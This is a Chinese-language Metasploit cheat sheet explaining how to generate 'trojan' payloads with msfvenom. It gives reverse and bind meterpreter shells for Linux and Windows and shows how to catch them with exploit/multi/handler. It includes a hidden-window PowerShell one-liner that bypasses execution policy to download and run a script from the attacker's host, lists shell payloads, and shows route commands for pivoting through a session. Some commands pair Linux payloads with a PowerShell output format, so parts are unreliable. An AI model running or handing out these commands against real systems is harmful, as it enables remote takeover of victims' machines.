## 用法示例：

>1. msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<本机ip地址> lport=<本机监听端口> -f psh-reflection  -o xx.ps1   //生成文件放在目标机目录下
>   //powershell执行脚本：powershell -windowstyle hidden -exec bypass IEX (New-Object  Net.WebClient).DownloadString('http://<yourip>/xxx.ps1');xxx.ps1
>2. use exploit/multi/handler
>3. set payload windows/x64/meterpreter/reverse_tcp
>4. show options
>5. set LHOST=XXX    RHOST=XXX
>6. run
>7. 目标主机执行木马文件

## msfvenon生成木马文件：
格式：msfvenom -p <payload> <payload options> -a <arch> --platform <platform> -e <encoder option> -i <encoder times> -b <bad-chars> -n <nopsled> -f <format> -o <path>
          // -e 常用编码    x86/shikata_ga_nai      cmd/powershell_base64
         // -f指指定的可执行文件类型   -o 指定输出地址。



## 反向连接：

- linux:

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<本机ip地址> LPORT=<本机监听端口> -f psh-reflection  -o xx.ps1
```

- windows:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<本机ip地址> LPORT=<本机监听端口> -f psh-reflection  -o xx.ps1
//生成64位系统木马：
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<本机ip地址> lport=<本机监听端口> -f psh-reflection  -o xx.ps1
```



## 正向连接：

- linux:

```
msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=<本机ip地址> LPORT=<本机监听端口> -f psh-reflection  -o xx.ps1
```

- windows:

```
msfvenom -p windows/meterpreter/bind_tcp LHOST=<本机ip地址> LPORT=<本机监听端口> -f psh-reflection  -o xx.ps1
```



## 启用exploit/multi/handler模块：

```
use exploit/multi/handler 
```



## 设置PAYLOAD：
- linux：

```
linux/x86/meterpreter/reverse_tcp  //反向payload
linux/x86/meterpreter/bind_tcp       //正向payload
linux/x86/shell_bind_tcp
linux/x86/shell_reverse_tcp
linux/x64/shell_reverse_tcp
linux/x64/shell_bind_tcp
```

- windows:

```
windows/meterpreter/reverse_tcp    //反向payload
windows/meterpreter/bind_tcp         //正向payload
windows/shell_reverse_tcp
windows/shell_bind_tcp
windows/x64/meterpreter/reverse_tcp
windows/x64/meterpreter/bind_tcp
windows/x64/shell_reverse_tcp
windows/x64/shell_bind_tcp
```



## 设置参数运行
```
set  .....

run
```



## 添加路由
```
route add <目标IP> <目标子网掩码>

示例：route add 10.0.0.1 255.0.0.0 1       //最后的1为添加该路由到session 1
```

